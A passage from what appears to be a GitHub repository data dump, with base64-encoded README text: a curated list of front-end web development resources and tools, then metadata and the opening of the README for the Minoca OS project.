YmplY3QgTW9kZWwsIGZyb20gTWljcm9zb2Z0XShodHRwOi8vbXNkbi5taWNy
b3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvaWUvaGg3NzIzODRcKHY9dnMuODVc
KS5hc3B4KQoqIFtEb2N1bWVudCBPYmplY3QgTW9kZWwsIGZyb20gTW96aWxs
YV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9E
T00pCiogW0V2ZW50IGNvbXBhdGliaWxpdHkgdGFibGVzXShodHRwOi8vd3d3
LnF1aXJrc21vZGUub3JnL2RvbS9ldmVudHMvaW5kZXguaHRtbCkKCi0tLQoK
IyMjIyMjQ1NTIFNwZWNzL1JlZiAmIFBvbHlmaWxscwoqIFtDU1MsIGZyb20g
TW96aWxsYV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMv
ZG9jcy9DU1MpCiogW0NTUyBTUEVDwq1Jwq1GScKtQ0HCrVRJT05TLCBmcm9t
IFczQ10oaHR0cDovL3d3dy53My5vcmcvU3R5bGUvQ1NTL2N1cnJlbnQtd29y
aykKKiBbaHR0cDovL2Nzc3ZhbHVlcy5jb20vXShodHRwOi8vY3NzdmFsdWVz
LmNvbS8pCiogW0NTUyBjb250ZW50cyBhbmQgYnJvd3NlciBjb21wYXRpYmls
aXR5XShodHRwOi8vd3d3LnF1aXJrc21vZGUub3JnL2Nzcy9jb250ZW50cy5o
dG1sKQoqIFtDU1MgQ29tcGF0aWJpbGl0eSBhbmQgSW50ZXJuZXQgRXhwbG9y
ZXJdKGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9j
YzM1MTAyNFwoVlMuODVcKS5hc3B4KQoqIFtIVE1MNSBDcm9zcyBCcm93c2Vy
IFBvbHlmaWxscyAobG9vayBmb3IgQ1NTKV0oaHR0cHM6Ly9naXRodWIuY29t
L01vZGVybml6ci9Nb2Rlcm5penIvd2lraS9IVE1MNS1Dcm9zcy1Ccm93c2Vy
LVBvbHlmaWxscykKKiBbQ1NTIFNlbGVjdG9ycyBmcm9tIENTUzQgdGlsbCBD
U1MxXShodHRwOi8vY3NzNC1zZWxlY3RvcnMuY29tL3NlbGVjdG9ycy8pCiog
W2NzczNjbGlja2NoYXJ0LmNvbV0oaHR0cDovL2NzczNjbGlja2NoYXJ0LmNv
bS8pCiogW0NTUyBzZWxlY3RvcnNdKGh0dHA6Ly93d3cucXVpcmtzbW9kZS5v
cmcvY3NzL3NlbGVjdG9ycy8pCgotLS0KCiMjIyMjI0NTUyBHZW5lcmF0b3Jz
CiogW3BhdHRlcm5pZnldKGh0dHA6Ly93d3cucGF0dGVybmlmeS5jb20vKQoq
IFtVbHRpbWF0ZSBDU1MgR3JhZGllbnQgR2VuZXJhdG9yXShodHRwOi8vd3d3
LmNvbG9yemlsbGEuY29tL2dyYWRpZW50LWVkaXRvci8pCiogW3BhdHRlcm5p
emVyXShodHRwOi8vcGF0dGVybml6ZXIuY29tLykKKiBbY3NzM3BsZWFzZS5j
b21dKGh0dHA6Ly9jc3MzcGxlYXNlLmNvbS8pCiogW2Nzc2Fycm93cGxlYXNl
LmNvbV0oaHR0cDovL2Nzc2Fycm93cGxlYXNlLmNvbS8pCiogW0NTUyBGbGV4
Ym94IFBsZWFzZV0oaHR0cDovL2RlbW8uYWdla3Rtci5jb20vZmxleGJveC8p
CiogW0NTUzMgR0VORVJBVE9SXShodHRwOi8vd3d3LmNzczMubWUvKQoqIFtj
c3MzZ2VuZXJhdG9yLmNvbV0oaHR0cDovL2NzczNnZW5lcmF0b3IuY29tLykK
KiBbY3NzM21ha2VyLmNvbV0oaHR0cDovL3d3dy5jc3MzbWFrZXIuY29tLykK
KiBbQ1NTMyBTYW5kYm94XShodHRwOi8vd2VzdGNpdi5jb20vdG9vbHMvaW5k
ZXguaHRtbCkKKiBbVGhlIFNoYXBlcyBvZiBDc3NdKGh0dHA6Ly9jb2Rlcndh
bGwuY29tL3AveHJ4YXhhKQoqIFtDU1MgbWF0aWNdKGh0dHA6Ly93d3cuY3Nz
bWF0aWMuY29tLykKKiBbZXh0cmFjdGNzcy5jb21dKGh0dHA6Ly9leHRyYWN0
Y3NzLmNvbS8pCgotLS0KCiMjIyMjI0NTUyBTdHlsZS9Db252ZW50aW9ucyBH
dWlkZXMKKiBba3NzXShodHRwczovL2dpdGh1Yi5jb20va25lYXRoL2tzcyNy
ZWFkbWUpCiogW1NNQUNTU10oaHR0cDovL3NtYWNzcy5jb20vKQoqIFtHb29n
bGUgSFRNTC9DU1MgU3R5bGUgR3VpZGVdKGh0dHA6Ly9nb29nbGUtc3R5bGVn
dWlkZS5nb29nbGVjb2RlLmNvbS9zdm4vdHJ1bmsvaHRtbGNzc2d1aWRlLnht
bCNEZWNsYXJhdGlvbl9vcmRlcikKKiBbaWRpb21hdGljLWNzc10oaHR0cHM6
Ly9naXRodWIuY29tL25lY29sYXMvaWRpb21hdGljLWNzcykKKiBbT2JqZWN0
LU9yaWVudGVkIENTU10oaHR0cDovL29vY3NzLm9yZy8pCiogW1dvcmRQcmVz
cy5vcmcgVUkgU3R5bGUgR3VpZGVdKGh0dHA6Ly9kb3RvcmdzdHlsZWd1aWRl
LndvcmRwcmVzcy5jb20vKQoqIFtTdGFyYnVja3MgU3R5bGUgR3VpZGVdKGh0
dHA6Ly93d3cuc3RhcmJ1Y2tzLmNvbS9zdGF0aWMvcmVmZXJlbmNlL3N0eWxl
Z3VpZGUvKQoqIFtHaXRodWIgQ1NTIHN0eWxlZ3VpZGVdKGh0dHBzOi8vZ2l0
aHViLmNvbS9zdHlsZWd1aWRlL2NzcykKKiBbR2VuZXJhbCBDU1Mgbm90ZXMs
IGFkdmljZSBhbmQgZ3VpZGVsaW5lc10oaHR0cHM6Ly9naXRodWIuY29tL2Nz
c3dpemFyZHJ5L0NTUy1HdWlkZWxpbmVzKQoqIFt5ZWxwIHN0eWxlZ3VpZGVd
KGh0dHA6Ly93d3cueWVscC5jb20vc3R5bGVndWlkZSkKCi0tLQoKIyMjIyMj
SmF2YVNjcmlwdCBFUzUgU3BlY3MvUmVmICYgUG9seWZpbGxzCiogW0VDTUEt
MjYyLTUgaW4gZGV0YWlsXShodHRwOi8vZG1pdHJ5c29zaG5pa292LmNvbS9l
Y21hc2NyaXB0L2VzNS1jaGFwdGVyLTAtaW50cm9kdWN0aW9uLykKKiBbRUNN
QVNjcmlwdCBMYW5ndWFnZSBTcGVjaWZpY2F0aW9uXShodHRwOi8vZWNtYS1p
bnRlcm5hdGlvbmFsLm9yZy9lY21hLTI2Mi81LjEvKQoqIFtBbm5vdGF0ZWQg
RUNNQVNjcmlwdCA1LjFdKGh0dHA6Ly9lczUuZ2l0aHViLmNvbS8pCiogW0VD
TUFTY3JpcHQgNSBjb21wYXRpYmlsaXR5IHRhYmxlXShodHRwOi8va2FuZ2F4
LmdpdGh1Yi5jb20vZXM1LWNvbXBhdC10YWJsZS8pCiogW0ludGVybmV0IEV4
cGxvcmVyIEVDTUEtMjYyIEVDTUFTY3JpcHQgTGFuZ3VhZ2UgU3BlY2lmaWNh
dGlvbiAoRmlmdGggRWRpdGlvbikgU3RhbmRhcmRzIFN1cHBvcnQgRG9jdW1l
bnRdKGh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9m
Zjk2MDc2OS5hc3B4KQoqIFtKYXZhU2NyaXB0IFJlZmVyZW5jZSwgZnJvbSBN
b3ppbGxhXShodHRwczovL2RldmVsb3Blci5tb3ppbGxhLm9yZy9lbi1VUy9k
b2NzL0phdmFTY3JpcHQvUmVmZXJlbmNlKQoqIFtUaGUgc2FtcGxlIHVzYWdl
IG9mIEVDTUEgNSBGZWF0dXJlcyBJbXBsZW1lbnRlZCBpbiBWOF0oaHR0cHM6
Ly9naXN0LmdpdGh1Yi5jb20vMTA3MzU0NykKKiBbVW5kZXJzdGFuZGluZyBK
YXZhU2NyaXB0IE9PUF0oaHR0cDovL2tpbGxkcmVhbS5naXRodWIuY29tL2Js
b2cvMjAxMS8xMC91bmRlcnN0YW5kaW5nLWphdmFzY3JpcHQtb29wLykKKiBb
SmF2YVNjcmlwdCwgYWthLiBXZWIgRUNNQVNjcmlwdCBMaXZpbmcgU3RhbmRh
cmRdKGh0dHA6Ly9tYXRoaWFzLmh0bWw1Lm9yZy9zcGVjcy9qYXZhc2NyaXB0
LykKKiBbZXM1LXNoaW1dKGh0dHBzOi8vZ2l0aHViLmNvbS9rcmlza293YWwv
ZXM1LXNoaW0vKQoqIFtwb2x5XShodHRwczovL2dpdGh1Yi5jb20vY3Vqb2pz
L3BvbHkpCiogW0F1Z21lbnQuanNdKGh0dHA6Ly9hdWdtZW50anMuY29tLykK
Ci0tLQoKIyMjIyMjSmF2YVNjcmlwdCBFUzYgU3BlY3MvUmVmICYgUG9seWZp
bGxzCiogW0VTNiB3aGF0IGNhbiBiZSBzaGltbWVkIGFuZCB3aGF0IG5vdF0o
aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vMTY2NTE5MikKKiBbRUNNQVNjcmlw
dCA2IGNvbXBhdGliaWxpdHkgdGFibGVdKGh0dHA6Ly9rYW5nYXguZ2l0aHVi
LmNvbS9lczUtY29tcGF0LXRhYmxlL2VzNi8pCiogW0RyYWZ0IFNwZWNpZmlj
YXRpb24gZm9yIEVTLm5leHQgKEVjbWEtMjYyIEVkaXRpb24gNildKGh0dHA6
Ly93aWtpLmVjbWFzY3JpcHQub3JnL2Rva3UucGhwP2lkPWhhcm1vbnk6c3Bl
Y2lmaWNhdGlvbl9kcmFmdHMpCiogW2VzNi1zaGltXShodHRwczovL2dpdGh1
Yi5jb20vcGF1bG1pbGxyL2VzNi1zaGltKQoqIFtFQ01BLTI2MiA2dGggRWRp
dGlvbi9EcmFmdF0oaHR0cDovL3Blb3BsZS5tb3ppbGxhLm9yZy9+am9yZW5k
b3JmZi9lczYtZHJhZnQuaHRtbCkKKiBbRUNNQVNjcmlwdCBTdXBwb3J0IE1h
dHJpeF0oaHR0cDovL3BvaW50ZWRlYXJzLmRlL3NjcmlwdHMvdGVzdC9lcy1t
YXRyaXgvKQoKLS0tCgojIyMjIyNKYXZhU2NyaXB0IFN0eWxlL0NvbnZlbnRp
b25zIEd1aWRlcwoqIFtHb29nbGUgSmF2YVNjcmlwdCBTdHlsZSBHdWlkZV0o
aHR0cDovL2dvb2dsZS1zdHlsZWd1aWRlLmdvb2dsZWNvZGUuY29tL3N2bi90
cnVuay9qYXZhc2NyaXB0Z3VpZGUueG1sKQoqIFtGZWxpeCdzIE5vZGUuanMg
U3R5bGUgR3VpZGVdKGh0dHA6Ly9ub2RlZ3VpZGUuY29tL3N0eWxlLmh0bWwp
CiogW2lkaW9tYXRpYy5qc10oaHR0cHM6Ly9naXRodWIuY29tL3J3bGRybi9p
ZGlvbWF0aWMuanMpCiogW0NvZGUgQ29udmVudGlvbnMgZm9yIHRoZSBKYXZh
U2NyaXB0IFByb2dyYW1taW5nIExhbmd1YWdlXShodHRwOi8vamF2YXNjcmlw
dC5jcm9ja2ZvcmQuY29tL2NvZGUuaHRtbCkKKiBbanNiZWF1dGlmaWVyXSho
dHRwOi8vanNiZWF1dGlmaWVyLm9yZy8pCiogW0FpcmJuYiBKYXZhU2NyaXB0
IFN0eWxlIEd1aWRlXShodHRwczovL2dpdGh1Yi5jb20vYWlyYm5iL2phdmFz
Y3JpcHQpCiogW01ldGVvciBTdHlsZSBHdWlkZV0oaHR0cHM6Ly9naXRodWIu
Y29tL21ldGVvci9tZXRlb3Ivd2lraS9NZXRlb3ItU3R5bGUtR3VpZGUpCgot
LS0KCiMjIyMjI0dlbmVyYWwgRnJvbnQtZW5kIFByYWN0aWNlcy9Db252ZW50
aW9ucwoqIFtpc29iYXJdKGh0dHA6Ly9pc29iYXItaWRldi5naXRodWIuY29t
L2NvZGUtc3RhbmRhcmRzLykKKiBbQmVpbmcgQSBXZWIgRGV2ZWxvcGVyXSho
dHRwOi8vd3d3LnllbGxvd3Nob2UuY29tLmF1L3N0YW5kYXJkcy8pCiogW0Zy
b250IEVuZCBEZXYgR3VpZGVsaW5lc10oaHR0cDovL3RhaXRlbXMuZ2l0aHVi
LmNvbS9Gcm9udC1FbmQtRGV2ZWxvcG1lbnQtR3VpZGVsaW5lcy8pCiogW0hU
TUwgYW5kIENTUyBjb2RlIGd1aWRlXShodHRwczovL2dpdGh1Yi5jb20vbWRv
L2NvZGUtZ3VpZGUpCgojI1BlcmZvcm1hbmNlCgojIyMjIyNUb29scwoKKiBb
Q2hhcmxlc10oaHR0cDovL3d3dy5jaGFybGVzcHJveHkuY29tLykKKiBbd2Vi
cGFnZXRlc3RdKGh0dHA6Ly93d3cud2VicGFnZXRlc3Qub3JnLykKKiBbUGFn
ZVNwZWVkIEluc2lnaHRzIEJyb3dzZXIgRXh0ZW5zaW9uc10oaHR0cHM6Ly9k
ZXZlbG9wZXJzLmdvb2dsZS5jb20vc3BlZWQvcGFnZXNwZWVkLykKKiBbQ2hy
b21lIERldmVsb3BlciBUb29sczogTmV0d29yayBQYW5lbF0oaHR0cHM6Ly9k
ZXZlbG9wZXJzLmdvb2dsZS5jb20vY2hyb21lLWRldmVsb3Blci10b29scy9k
b2NzL25ldHdvcmspCiogW0Nocm9tZSBEZXZlbG9wZXIgVG9vbHM6IFRpbWVs
aW5lIFBhbmVsXShodHRwczovL2RldmVsb3BlcnMuZ29vZ2xlLmNvbS9jaHJv
bWUtZGV2ZWxvcGVyLXRvb2xzL2RvY3MvdGltZWxpbmUpCiogW0Nocm9tZSBE
ZXZlbG9wZXIgVG9vbHM6IFByb2ZpbGVzIFBhbmVsXShodHRwczovL2RldmVs
b3BlcnMuZ29vZ2xlLmNvbS9jaHJvbWUtZGV2ZWxvcGVyLXRvb2xzL2RvY3Mv
cHJvZmlsZXMpCiogW0RPTSBNb25zdGVyXShodHRwOi8vbWlyLmFjdWxvLnVz
L2RvbS1tb25zdGVyLykKKiBbSW1hZ2VPcHRpbV0oaHR0cDovL2ltYWdlb3B0
aW0uY29tLykKCiMjIyMjI1J1bGVzL1ByYWN0aWNlcwoKKiBbV2ViIFBlcmZv
cm1hbmNlIEJlc3QgUHJhY3RpY2VzXShodHRwczovL2RldmVsb3BlcnMuZ29v
Z2xlLmNvbS9zcGVlZC9kb2NzL2Jlc3QtcHJhY3RpY2VzL3J1bGVzX2ludHJv
KQoqIFtCZXN0IFByYWN0aWNlcyBmb3IgU3BlZWRpbmcgVXAgWW91ciBXZWIg
U2l0ZV0oaHR0cDovL2RldmVsb3Blci55YWhvby5jb20vcGVyZm9ybWFuY2Uv
cnVsZXMuaHRtbCkKKiBbSGlnaCBQZXJmb3JtYW5jZSBXZWIgU2l0ZXMgLSAx
NCBSdWxlcyBmb3IgRmFzdGVyLUxvYWRpbmcgV2ViIFNpdGVzXShodHRwOi8v
c3RldmVzb3VkZXJzLmNvbS9ocHdzLykKKiBbRXZlbiBGYXN0ZXIgV2ViIFNp
dGVzXShodHRwOi8vc3RldmVzb3VkZXJzLmNvbS9lZndzLykKKiBbZ29vZ2xl
IHdlYiBmdW5kYW1lbnRhbHNdKGh0dHBzOi8vZGV2ZWxvcGVycy5nb29nbGUu
Y29tL3dlYi9mdW5kYW1lbnRhbHMvKQoKCiMjT25saW5lIFJFUEwncy9lZGl0
b3JzL0lERSdzCgojIyMjIyNKUyBSRVBMCiogW3JlcGwuaXRdKGh0dHA6Ly9y
ZXBsLml0LykKKiBbanNjb25zb2xlLmNvbV0oaHR0cDovL2pzY29uc29sZS5j
b20vKQoqIFtjb2RlYm9vdC5vcmddKGh0dHA6Ly9jb2RlYm9vdC5vcmcvKQoq
IFtjb250aW51dW1dKGh0dHA6Ly9iZW52aWUuZ2l0aHViLmNvbS9jb250aW51
dW0vKQoKIyMjIyMjSlMgZm9jdXNlZCBlZGl0b3JzCiogW2pzZmlkZGxlXSho
dHRwOi8vanNmaWRkbGUubmV0LykKKiBbanNiaW5dKGh0dHA6Ly9qc2Jpbi5j
b20vKQoqIFtlczZmaWRkbGVdKGVzNmZpZGRsZS5uZXQpCgojIyMjIyNSZWd1
bGFyIEV4cHJlc3Npb24gZWRpdG9ycwoqIFtTY3JpcHR1bGFyXShodHRwOi8v
c2NyaXB0dWxhci5jb20vKQoqIFtyZWdleHJdKGh0dHA6Ly9nc2tpbm5lci5j
b20vUmVnRXhyLykKKiBbcmVmaWRkbGVdKGh0dHA6Ly9yZWZpZGRsZS5jb20v
KQoqIFtSZWdleFBsYW5ldF0oaHR0cDovL3d3dy5yZWdleHBsYW5ldC5jb20v
KQoKIyMjIyMjSFRNTC9DU1MgZWRpdG9ycwoqIFtkYWJibGV0XShodHRwOi8v
ZGFiYmxldC5jb20vKQoqIFtjc3NkZXNrXShodHRwOi8vY3NzZGVzay5jb20v
KQoKIyMjIyMjSFRNTC9DU1MvSlMgZWRpdG9ycwoqIFt0aW5rZXIuaW9dKGh0
dHBzOi8vdGlua2VyLmlvLykKKiBbdGlua2VyYmluXShodHRwOi8vdGlua2Vy
YmluLmNvbS8pCiogW1BsdW5rZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9maWxl
YXJ0cy9wbHVua2VyKQoqIFtjc3NkZWNrXShodHRwOi8vY3NzZGVjay5jb20v
KQoqIFtjb2RlcGVuXShodHRwOi8vY29kZXBlbi5pby8pCiogW2xpdmV3ZWF2
ZV0oaHR0cDovL2xpdmV3ZWF2ZS5jb20vKQoqIFtjb2RlbWFnaWMuZ3JdKGh0
dHA6Ly9jb2RlbWFnaWMuZ3IvKQoKIyMjIyMjRXhlY3V0ZS9UZXN0IGxpdmUg
Y29kZQoqIFtydW5uYWJsZV0oaHR0cDovL3J1bm5hYmxlLmNvbS8pCgojIyMj
IyNCcm93c2VyIElERSdzCiogW2tvZGluZ10oaHR0cHM6Ly9rb2RpbmcuY29t
LykKKiBbY2xvdWQ5IElERV0oaHR0cHM6Ly9jOS5pby8pCiogW2FjdGlvbi5p
b10oaHR0cHM6Ly93d3cuYWN0aW9uLmlvKQoKIyMjIyMjSlNPTiBlZGl0b3Jz
CiogW2pzb25lZGl0b3JvbmxpbmUub3JnXShodHRwOi8vanNvbmVkaXRvcm9u
bGluZS5vcmcvKQoqIFtKU09OIFRpbmtlcl0oaHR0cDovL2pzb24uYnViYmxl
bWl4Lm5ldC8pCiogW0pTT05tYXRdKGh0dHA6Ly9qc29ubWF0ZS5jb20vKQoK
IyNCcm93c2VyIFNlY3VyaXR5CgoqIFtCcm93c2VyIFNlY3VyaXR5IEhhbmRi
b29rXShodHRwOi8vY29kZS5nb29nbGUuY29tL3AvYnJvd3NlcnNlYy93aWtp
L01haW4pCiogW0RPTVB1cmlmeV0oaHR0cHM6Ly9naXRodWIuY29tL2N1cmU1
My9ET01QdXJpZnkpCiogW2h0bWw1c2VjLm9yZ10oaHR0cHM6Ly9odG1sNXNl
Yy5vcmcvKQoqIFtqcy14c3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9sZWl6b25n
bWluL2pzLXhzcykKCiMjQnJvd3NlciBIYWNrcwoKKiBbYnJvd3NlcmhhY2tz
LmNvbV0oaHR0cDovL3d3dy5icm93c2VyaGFja3MuY29tLykKCgojI0FQSSBm
aXJzdCwgQ01TIFNlcnZpY2UKCiogW2NvbnRlbnRmdWxdKGh0dHBzOi8vd3d3
LmNvbnRlbnRmdWwuY29tKQoqIFtwcmlzbWljLmlvXShodHRwczovL3ByaXNt
aWMuaW8pCgoKIyNCYWNrZW5kIHNlcnZpY2VzIGZvciBmcm9udC1lbmQgZGV2
ZWxvcGVycwoKKiBbZmlyZWJhc2VdKGh0dHBzOi8vd3d3LmZpcmViYXNlLmNv
bS9pbmRleC5odG1sKQoqIFtwdXNoZXJdKGh0dHA6Ly9wdXNoZXIuY29tLykK
KiBbamF5c3RhY2tdKGh0dHA6Ly9qYXlzdGFjay5jb20vKQoqIFtwYXJzZV0o
aHR0cHM6Ly93d3cucGFyc2UuY29tKQoqIFtzaW5nbHldKGh0dHBzOi8vc2lu
Z2x5LmNvbS8pCiogW2Nsb3VkIENNU10oaHR0cHM6Ly93d3cuY2xvdWRjbXMu
Y29tLykKKiBba2ludmV5XShodHRwOi8vd3d3LmtpbnZleS5jb20vKQoqIFtz
dGFja21vYl0oaHR0cDovL3d3dy5zdGFja21vYi5jb20vKQoqIFtjbG91ZG1p
bmVdKGh0dHBzOi8vY2xvdWRtaW5lLm1lLykKKiBba3VtdWxvc10oaHR0cDov
L3d3dy5rdW11bG9zLmNvbS8pCiogW2RlcGxveWRdKGh0dHA6Ly9kZXBsb3lk
LmNvbS8pCiogW2JhY2tsaWZ0LmNvbV0oaHR0cHM6Ly9iYWNrbGlmdC5jb20v
aW5kZXguaHRtbCkKKiBbaHVsbC5pb10oaHR0cDovL2h1bGwuaW8vKQoqIFtz
dG9ybXBhdGguY29tXShodHRwOi8vc3Rvcm1wYXRoLmNvbS8pCiogW2RyZWFt
ZmFjdG9yeV0oaHR0cHM6Ly93d3cuZHJlYW1mYWN0b3J5LmNvbS8pCiogW3Vz
ZXJhcHAuaV0oaHR0cHM6Ly93d3cudXNlcmFwcC5pby8pCiogW2dvaW5zdGFu
dF0oaHR0cHM6Ly9nb2luc3RhbnQuY29tLykKKiBbbXlqc29uLmNvbV0oaHR0
cDovL215anNvbi5jb20vKQoKIyNBUEkgdG9vbHMKCiogW2FwaWFyeV0oaHR0
cDovL2FwaWFyeS5pby8pCiogW2FwaSBlbmdpbmVdKGh0dHBzOi8vYXBpZW5n
aW5lLmlvLykKKiBbU3dhZ2dlcl0oaHR0cHM6Ly9kZXZlbG9wZXJzLmhlbGxv
cmV2ZXJiLmNvbS9zd2FnZ2VyLykKKiBbcG9zdG1hbl0oaHR0cDovL3d3dy5n
ZXRwb3N0bWFuLmNvbS8pCiogW2FwaWRvY2pzXShodHRwOi8vYXBpZG9janMu
Y29tLykKKiBbYXBpYmx1ZXByaW50XShodHRwOi8vYXBpYmx1ZXByaW50Lm9y
Zy8pCgojI0FQSSBNb2NraW5nCgoqIFttb2NreS5pb10oaHR0cDovL3d3dy5t
b2NreS5pby8pCiogW0ZpbGxUZXh0LmNvbV0oaHR0cDovL3d3dy5maWxsdGV4
dC5jb20vKQoqIFtKU09OUGxhY2Vob2xkZXJdKGh0dHA6Ly9qc29ucGxhY2Vo
b2xkZXIudHlwaWNvZGUuY29tLykKKiBbZmFrZXIuanNdKGh0dHBzOi8vZ2l0
aHViLmNvbS9NYXJhay9GYWtlci5qcykKKiBbanNvbi1nZW5lcmF0b3JdKGh0
dHA6Ly93d3cuanNvbi1nZW5lcmF0b3IuY29tKQoqIFtjYWRkaXNdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9idXN0YXJkY2VsbHkvY2FkZGlzKQoqIFtkeXNvbl0o
aHR0cHM6Ly9naXRodWIuY29tL3dlYnByby9keXNvbikKKiBbanNvbi1zZXJ2
ZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS90eXBpY29kZS9qc29uLXNlcnZlcikK
CiMjSW1hZ2UgTW9ja2luZwoKKiBbcGxhY2VraXR0ZW5dKGh0dHA6Ly9wbGFj
ZWtpdHRlbi5jb20vKQoqIFtQTEFDRUhPTEQuSVRdKGh0dHA6Ly9wbGFjZWhv
bGQuaXQvKQoqIFtoaGhob2xkLmNvbV0oaHR0cDovL2hoaGhvbGQuY29tLykK
CiMjSlNPTiBRdWVyeSBUb29scwoKKiBbVGFmZnlEQl0oaHR0cDovL3d3dy50
YWZmeWRiLmNvbS8pCiogW2xpbnEuanNdKGh0dHA6Ly9saW5xanMuY29kZXBs
ZXguY29tLykKKiBbanNvbjpzZWxlY3QoKV0oaHR0cDovL2pzb25zZWxlY3Qu
b3JnLykKKiBbSlNPTmlxXShodHRwOi8vd3d3Lmpzb25pcS5vcmcvKQoqIFtq
c29uLXF1ZXJ5XShodHRwczovL2dpdGh1Yi5jb20vbW1ja2VnZy9qc29uLXF1
ZXJ5KQoqIFtTcGFoUUxdKGh0dHA6Ly9kYW5za2kuZ2l0aHViLmlvL3NwYWhx
bC8pCiogW2pzb24tbWFza10oaHR0cHM6Ly9naXRodWIuY29tL25lbXRzb3Yv
anNvbi1tYXNrKQoqIFtvYmplcV0oaHR0cHM6Ly9naXRodWIuY29tL2FnaWxv
c29mdHdhcmUvb2JqZXEpCgojI0pTT04gVmFsaWRhdGlvbiBUb29scwoKKiBb
U0NIRU1BLUlOU1BFQ1RPUl0oaHR0cDovL2F0aW51eC5naXRodWIuaW8vc2No
ZW1hLWluc3BlY3Rvci8pCgoKIyNGcm9udC1lbmQgREIncwoKKiBbcG91Y2hk
Yl0oaHR0cDovL3BvdWNoZGIuY29tLykKKiBbV2ViIFN0b3JhZ2VdKGh0dHA6
Ly93d3cudzMub3JnL1RSL3dlYnN0b3JhZ2UvKQoqIFtJbmRleGVkIERhdGFi
YXNlIEFQSV0oaHR0cDovL3d3dy53My5vcmcvVFIvSW5kZXhlZERCLykKKiBb
bG9raUpTXShodHRwOi8vbG9raWpzLm9yZy8pCiogW3VuZGVyc2NvcmUuZGJd
KGh0dHBzOi8vZ2l0aHViLmNvbS90eXBpY29kZS91bmRlcnNjb3JlLmRiKQoq
IFtCYXNlZCBKU10oaHR0cHM6Ly9naXRodWIuY29tL1RyZW1heW5lQ2hyaXN0
L0Jhc2VkKQoKIyNDYXRhbG9nL0NvbGxlY3Rpb24gb2YgSmF2YVNjcmlwdCBM
aWJzIGFuZCBUb29scwoKKiBbanN0ZXJdKGh0dHA6Ly9qc3Rlci5uZXQvKQoq
IFt0aGV0b29sYm94LmNjXShodHRwOi8vdGhldG9vbGJveC5jYy8pCiogW2ph
dmFzY3JpcHRvby5jb21dKGh0dHA6Ly93d3cuamF2YXNjcmlwdG9vLmNvbS8p
CiogW21pY3JvanMuY29tXShodHRwOi8vbWljcm9qcy5jb20vKQoqIFtKU0RC
LklPXShodHRwOi8vd3d3LmpzZGIuaW8vP3NvcnQ9dHJlbmRpbmcpCgoKIyNT
dGF0aWMgU2l0ZSBHZW5lcmF0b3JzCgoqIFtodHRwOi8vc3RhdGljc2l0ZWdl
bmVyYXRvcnMubmV0L10oaHR0cDovL3N0YXRpY3NpdGVnZW5lcmF0b3JzLm5l
dC8pCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'os',72385590,b'Minoca operating system',b'C',20,2385,,2385,False,b'https://api.github.com/repos/minoca/os/forks',"IyBNaW5vY2EgT1MKCk1pbm9jYSBPUyBpcyBhIGdlbmVyYWwgcHVycG9zZSBv
cGVyYXRpbmcgc3lzdGVtIHdyaXR0ZW4gZnJvbSBzY3JhdGNoLiBJdCBhaW1z
IHRvIGJlIGxlYW4sIG1haW50YWluYWJsZSwgbW9kdWxhciwgYW5kIGNvbXBh
dGlibGUgd2l0aCBleGlzdGluZyBzb2Z0d2FyZS4gSXQgZmVhdHVyZXMgYSBQ
T1NJWC1saWtlIGludGVyZmFjZSB0b3dhcmRzIGFwcGxpY2F0aW9uIHNvZnR3
YXJlLCBhbmQgYSBncm93aW5nIHN1aXRlIG9mIHBvcHVsYXIgcGFja2FnZXMg
YWxyZWFkeSBidWlsdCBhbmQgcmVhZHkgdG8gZ28uIE9uIHRoZSBiYWNrZW5k
LCBpdCBjb250YWlucyBhIHBvd2VyZnVsIGRyaXZlciBtb2RlbCBiZXR3ZWVu
IGRldmljZSBkcml2ZXJzIGFuZCB0aGUga2VybmVsLiBUaGUgZHJpdmVyIG1v
ZGVsIGVuYWJsZXMgZHJpdmVycyB0byBiZSB3cml0dGVuIGluIGEgZm9yd2Fy
ZCBjb21wYXRpYmxlIG1hbm5lciwgc28gdGhhdCBrZXJuZWwgbGV2ZWwgY29t
cG9uZW50cyBjYW4gYmUgdXBncmFkZWQgd2l0aG91dCBuZWNlc3NhcmlseSBy
ZXF1aXJpbmcgYSByZWNvbXBpbGF0aW9uIG9mIGFsbCBkZXZpY2UgZHJpdmVy
cy4KCk1pbm9jYSBPUyBpcyBldmVudCBkcml2ZW4sIHByZWVtcHRpYmxlLCBT
TVAgcmVhZHksIGFuZCBuZXR3b3JrIGNhcGFibGUuIEl0IGN1cnJlbnRseSBy
dW5zIG9uIHg4NiBQQ3MgYW5kIGEgcmFuZ2Ugb2YgQVJNIGJvYXJkcy4KCiMj
IyBTY3JlZW5zaG90cwohW0luc3RhbGxpbmcgR2l0IG9uIE1pbm9jYSBPU10o
ZG9jcy9zY3JlZW5zaG90cy9JbnN0YWxsaW5nLUdpdC5wbmcpCiFbTWVtb3J5
IFByb2ZpbGVyXShkb2NzL3NjcmVlbnNob3RzL01lbW9yeS1Qcm9maWxlci5w
bmcpCiFbU3RhY2sgUHJvZmlsZXJdKGRvY3Mvc2NyZWVuc2hvdHMvU3RhY2st
UHJvZmlsZXIucG5nKQoKIyMjIEdldHRpbmcgU3RhcnRlZApJZiB5b3UncmUg
anVzdCBsb29raW5nIHRvIHRyeSBvdXQgTWlub2NhIE9TLCBoZWFkIG92ZXIg
dG8gb3VyIFtkb3dubG9hZF0oaHR0cHM6Ly93d3cubWlub2NhY29ycC5jb20v
ZG93bmxvYWQvKSBwYWdlIHRvIGdyYWIgdGhlIGxhdGVzdCBzdGFibGUgaW1h
